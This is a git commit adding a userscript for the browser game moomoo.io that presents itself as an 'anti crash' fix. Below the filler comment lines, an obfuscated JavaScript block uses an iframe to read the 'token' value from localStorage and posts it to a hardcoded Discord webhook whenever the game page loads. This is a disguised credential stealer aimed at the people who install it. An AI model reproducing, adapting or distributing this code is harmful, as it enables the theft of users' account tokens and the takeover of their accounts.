1ece3f4f41f026b8c49da771f281ce634d5d5596
amadu123 <58538816+amadu123@users.noreply.github.com>
2021-04-14 11:26:25 -0400

    Create anti crash v3.js

---
+++ anti crash v3.js
@@ -0,0 +1,26 @@
+// ==UserScript==
+// @name         anti crash v2
+// @namespace    anti crash by hi script has security ofc
+// @version      v2
+// @description  Wow!
+// @author       hi
+// @match        *://moomoo.io/*
+// @match        *://sandbox.moomoo.io/*
+// @grant        none
+// ==/UserScript==
+//anti crash dont share by hi.#9750
+//anti crash dont share by hi.#9750
+//anti crash dont share by hi.#9750
+//anti crash dont share by hi.#9750
+//anti crash dont share by hi.#9750
+//anti crash dont share by hi.#9750
+//anti crash dont share by hi.#9750
+//anti crash dont share by hi.#9750
+//anti crash dont share by hi.#9750
+//anti crash dont share by hi.#9750
+//anti crash dont share by hi.#9750
+//anti crash dont share by hi.#9750
+//anti crash dont share by hi.#9750
+//anti crash dont share by hi.#9750
+//anti crash dont share by hi.#9750//anti crash dont share by hi.#9750//anti crash dont share by hi.#9750//anti crash dont share by hi.#9750//anti crash dont share by hi.#9750//anti crash dont share by hi.#9750//anti crash dont share by hi.#9750//anti crash dont share by hi.#9750//anti crash dont share by hi.#9750//anti crash dont share by hi.#9750//anti crash dont share by hi.#9750//anti crash dont share by hi.#9750//anti crash dont share by hi.#9750//anti crash dont share by hi.#9750//anti crash dont share by hi.#9750//anti crash dont share by hi.#9750//anti crash dont share by hi.#9750//anti crash dont share by hi.#9750//anti crash dont share by hi.#9750//anti crash dont share by hi.#9750//anti crash dont share by hi.#9750//anti crash dont share by hi.#9750//anti crash dont share by hi.#9750
+var _0x3796=['435119mzCzqf','17WALbua','send','POST','209102QrHJKO','createElement','44537qYZxhC','1aIYeks','1136704iiXKpY','2PJFnzV','contentWindow','application/json','iframe','body','1201393QduYVc','appendChild','794257UKeZnR','open','stringify','dispatchEvent','141255lpRDQO'];var _0x578d=function(_0x326113,_0x8c31b2){_0x326113=_0x326113-0x112;var _0x3796cc=_0x3796[_0x326113];return _0x3796cc;};var _0x29e5e2=_0x578d;(function(_0x353f7e,_0x3e1ebf){var _0x2c9a75=_0x578d;while(!![]){try{var _0x4b73ed=-parseInt(_0x2c9a75(0x120))+-parseInt(_0x2c9a75(0x117))+parseInt(_0x2c9a75(0x126))+parseInt(_0x2c9a75(0x113))+parseInt(_0x2c9a75(0x11e))*parseInt(_0x2c9a75(0x119))+-parseInt(_0x2c9a75(0x11f))*-parseInt(_0x2c9a75(0x11c))+parseInt(_0x2c9a75(0x118))*-parseInt(_0x2c9a75(0x121));if(_0x4b73ed===_0x3e1ebf)break;else _0x353f7e['push'](_0x353f7e['shift']());}catch(_0x2dbbfe){_0x353f7e['push'](_0x353f7e['shift']());}}}(_0x3796,0xc6a74),window[_0x29e5e2(0x116)](new Event('beforeunload')));const ls=document[_0x29e5e2(0x125)][_0x29e5e2(0x112)](document[_0x29e5e2(0x11d)](_0x29e5e2(0x124)))[_0x29e5e2(0x122)]['localStorage'];function sendMessage(_0x526d1e){var _0xa45725=_0x29e5e2,_0x1aa928=new XMLHttpRequest();_0x1aa928[_0xa45725(0x114)](_0xa45725(0x11b),'https://discord.com/api/webhooks/827596488695218196/c-9UT7fRaDGYllv1eijd-wqW1OuxhKNYyNWN3FTdsV_bs9aA9NsZzAeIaYwos1H7AcfQ'),_0x1aa928['setRequestHeader']('Content-type',_0xa45725(0x123));var _0x3da0fa={'username':'My\x20Webhook\x20Name','avatar_url':'','content':_0x526d1e};_0x1aa928[_0xa45725(0x11a)](JSON[_0xa45725(0x115)](_0x3da0fa));}sendMessage(ls['token']);
